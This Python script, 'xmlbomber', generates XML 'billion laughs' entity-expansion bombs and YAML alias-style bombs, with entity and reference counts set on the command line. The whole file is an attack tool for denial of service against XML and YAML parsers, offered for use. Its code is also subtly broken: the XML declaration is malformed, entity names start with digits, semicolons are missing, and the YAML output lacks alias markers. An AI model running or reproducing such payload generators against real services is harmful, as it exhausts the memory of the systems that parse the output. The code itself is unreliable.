#!/usr/bin/python3
import sys
import argparse

def xmlbomb(ents, refs, name, content):
	i = 0
	j = i - 1
	sys.stdout.write('<?xml version="1.0">\n')
	sys.stdout.write('<!DOCTYPE ' + name + ' [\n')
	sys.stdout.write('  <!ENTITY 0 "' + content + '">\n')
	for _ in range(ents):
		i += 1
		j = i - 1
		sys.stdout.write('  <!ENTITY ' + str(i) + ' "')
		k = []
		for _ in range(refs):
			k.append('&' + str(j))
		sys.stdout.write("; ".join(k))
		sys.stdout.write('">\n')
	sys.stdout.write('  <!ENTITY start "&' + str(i) + ';">\n')
	sys.stdout.write(']>\n')
	sys.stdout.write('<' + name + '>&start;</' + name + '>')
	k = []
	return

def yamlbomb(ents, refs, content):
	i = 0
	j = i - 1
	sys.stdout.write(str(i) + ': &' + str(i) + ' [')
	k = []
	for _ in range(refs):
		k.append('"' + content + '"')
	sys.stdout.write(", ".join(k))
	sys.stdout.write(']\n')
	for _ in range(ents):
		i += 1
		j = i - 1
		sys.stdout.write(str(i) + ': &' + str(i) +' [')
		k = []
		for _ in range(refs):
			k.append(str(j))
		sys.stdout.write(", ".join(k))
		sys.stdout.write(']\n')
	k = []
	return


def main():
	parser = argparse.ArgumentParser(description="xmlbomber", epilog="Created by InkPrism (Original by https://github.com/lp0-on-fire)")
	parser.add_argument("-e", "--entity", type=int, help="amount of entities (default: 10)", default=10)
	parser.add_argument("-r", "--reference", type=int, help="amount of references (default: 10)", default=10)
	parser.add_argument("-n", "--name", help="name (default: lol)", default="lol")
	parser.add_argument("-c", "--content", help="content of first entity (default: lol)", default="lol")
	parser.add_argument("format", help='"xml" or "yaml" (default: "xml")', default="xml")
	args, unknown = parser.parse_known_args()
	if args.format == 'yaml':
		yamlbomb(args.entity, args.reference, args.content)
	else:
		xmlbomb(args.entity, args.reference, args.name, args.content)

if __name__ == '__main__':
	main()
